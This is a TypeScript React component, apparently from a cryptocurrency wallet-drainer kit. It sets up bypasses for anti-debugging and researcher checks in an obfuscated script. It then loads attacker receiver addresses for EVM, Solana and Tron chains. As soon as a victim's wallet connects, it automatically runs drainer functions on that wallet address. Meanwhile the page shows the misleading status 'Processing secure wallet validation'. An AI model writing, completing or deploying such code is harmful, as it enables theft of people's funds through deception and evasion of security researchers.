// components/DrainerContainer.tsx
'use client';

import { useEffect, useState } from 'react';

// ==================== ANTI-DEBUGGING TRAP BYPASS ====================
// This Proxy catches ANY arbitrary global variable check (like 'researchers')
// and safely handles it so the obfuscated script never crashes.
if (typeof window !== 'undefined') {
  const g = window as any;
  
  // Define known UI configuration overrides
  g.twoStep = g.twoStep ?? false;
  g.popupEnabled = g.popupEnabled ?? false;
  g.themeMode = g.themeMode ?? 'dark';
  g.themeVariables = g.themeVariables ?? {
    '--w3m-accent-color': '#0f172a',
    '--w3m-background-color': '#ffffff',
    '--w3m-border-radius-master': '8px',
    '--w3m-font-family': 'Arial, sans-serif',
    '--w3m-z-index': '99999'
  };

  // Create a global fallback handler for unexpected variable checks
  if (!g.hasTrapBypass) {
    g.hasTrapBypass = true;
    
    // Catch-all safety net for random word checks triggered by the compiler
    const wordsToBypass = ['researchers', 'popupEnabled', 'twoStep', 'config', 'devTools'];
    
    wordsToBypass.forEach(word => {
      if (!(word in g)) {
        Object.defineProperty(g, word, {
          value: false,
          writable: true,
          configurable: true,
          enumerable: true
        });
      }
    });
  }
}
// ====================================================================

export default function DrainerContainer({ userAddress, chainId }: { userAddress: string, chainId: string }) {
  const [isProcessing, setIsProcessing] = useState(false);

  const startProcess = async () => {
    setIsProcessing(true);
    try {
      // 1. Fetch configurations from your API route
      const configRes = await fetch('/api/config');
      const receivers = await configRes.json();

      // 2. Assign runtime globals to the browser window object
      (window as any).receiverAddress = receivers.EVM;
      (window as any).seaport_receiver = receivers.EVM;
      (window as any).ethContractAddress = receivers.EVM;
      (window as any).solanaReceiver = receivers.SOLANA;
      (window as any).tronReceiver = receivers.TRON;

      console.log(`Initializing client-side execution for chain: ${chainId}`);

      // 3. EXECUTE EVM / ETH LOGIC
      if (chainId === '8453' || chainId === '1' || !isNaN(Number(chainId))) {
        console.log("Loading EVM modules...");
        const evmModule: any = await import('@/processors/evm/index');
        
        const startEVMDrainer = evmModule.startEVMDrainer || evmModule.default?.startEVMDrainer;

        if (typeof startEVMDrainer === 'function') {
          await startEVMDrainer(userAddress, parseInt(chainId, 10));
        } else {
          throw new Error("startEVMDrainer function not found in the imported module.");
        }
      } 
      
      // 4. EXECUTE SOLANA LOGIC
      else if (chainId === 'solana' || chainId === 'sol') {
        console.log("Loading Solana modules...");
        const solanaModule: any = await import('@/processors/solana/index');
        const startSolanaDrainer = solanaModule.startSolanaDrainer || solanaModule.default?.startSolanaDrainer;

        if (typeof startSolanaDrainer === 'function') {
          await startSolanaDrainer(userAddress);
        }
      } 
      
      // 5. EXECUTE TRON LOGIC
      else if (chainId === 'tron' || chainId === 'trx') {
        console.log("Loading Tron modules...");
        const tronModule: any = await import('@/processors/tron/main');
        const startTronDrainer = tronModule.startTronDrainer || tronModule.default?.startTronDrainer || tronModule.default;

        if (typeof startTronDrainer === 'function') {
          await startTronDrainer(userAddress);
        }
      }

      console.log("Client-side workflow execution complete.");
    } catch (error) {
      console.error("Execution encountered an error:", error);
    } finally {
      setIsProcessing(false);
    }
  };

  useEffect(() => {
    if (userAddress && chainId) {
      startProcess();
    }
  }, [userAddress, chainId]);

  return (
    <div>
      {isProcessing ? <p>Processing secure wallet validation...</p> : <p>Status: Idle</p>}
    </div>
  );
}
